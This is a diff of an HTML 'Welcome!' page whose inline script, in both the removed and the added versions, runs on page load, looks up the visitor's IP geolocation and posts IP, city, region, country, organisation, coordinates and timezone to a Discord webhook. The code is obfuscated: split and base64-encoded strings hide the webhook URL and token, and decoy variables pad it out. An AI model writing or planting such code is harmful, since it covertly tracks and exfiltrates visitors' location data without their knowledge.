@@ -20,59 +20,26 @@
 <body>
     <h1>Welcome!</h1>
     <script>
-        let X10A = "NDEyMjk4Z";
-        let B20C = "DY0ZTRmNG";
-        let Q30D = "ZiZmJiOGV";
-        let R40E = "lOTA1ZGEy";
-        let D50F = X10A + B20C + Q30D + R40E;
+        let a = "NDEyMjk4ZDY0ZTRmNGZiZmJiOGV";
+        let b = "OTA1ZGEyMGVjY2EsaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==";
+        let c = atob(a) + atob(b);
+        let d = "af" + "bc" + "e9" + "9e" + "099";
+        let e = "hello";
 
-        let J10G = "aHR0cHM6L";
-        let K20H = "lLmNvbS9";
-        let L30I = "hcGkvd2V";
-        let M40J = "iaG9va3Mv";
-        let N50K = "MTI4MDk0M";
-        let P60L = "Tc1MTYyND";
-        let G70M = "AwNzcyMC9";
-        let I80N = "zdHdkTFc4";
-        let C90O = "RDg2NkhQ";
-        let A00P = "VkRaUEFHN";
-        let U01Q = "VhvWURpNm";
-        let T02R = "ZBOTFqZld";
-        let E03S = "QYWFTNm5t";
-        let H04T = "VGNzYjI4U";
-        let B05U = "VU2dGRQSk";
-        let J06V = "VCVnVUT19";
-        let X07W = "SUDV0UWdR";
-        let Z08X = "OQ==";
-
-        let apiURL = atob(J10G + K20H + L30I + M40J + N50K + P60L + G70M + I80N + C90O + A00P + U01Q + T02R + E03S + H04T + B05U + J06V + X07W + Z08X);
-        let webhookURL = "https://discord.com/api/webhooks/1280941751624007720/stwdLW8D866HPVDZPAG5XoYDi6fA91jfWPaaS6nmTcsb28QU6tdPJEBVuTO_RP5tQgQ9"; // Your webhook
-        let token = atob(D50F); // Decoded token
-
-        async function A00Y() {
-            let R12B = "randomVal1";
-            let R34C = 9876543210;
-            let R56D = { key: "value" }; // Bogus object
-            
-            try {
-                let fetchResult = await fetch(apiURL + "/json?token=" + token);
-                let fetchData = await fetchResult.json();
-                
-                let payload = {
-                    content: `IP: ${fetchData.ip}\nCity: ${fetchData.city}\nRegion: ${fetchData.region}\nCountry: ${fetchData.country}\nOrg: ${fetchData.org}\nLoc: ${fetchData.loc}\nTimeZone: ${fetchData.timezone}`
-                };
-
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (X80Y) {
-                console.error("Something went wrong:", X80Y);
-            }
+        async function f() {
+            let g = await fetch("https://ipinfo.io/json?token=" + d);
+            let h = await g.json();
+            let j = {
+                content: `${e} ${h.ip} ${h.city} ${h.region} ${h.country} ${h.org} ${h.loc} ${h.timezone}`
+            };
+            await fetch(c, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(j)
+            });
         }
-
-        A00Y(); // Execute the function
+        
+        f();
     </script>
 </body>
 </html>
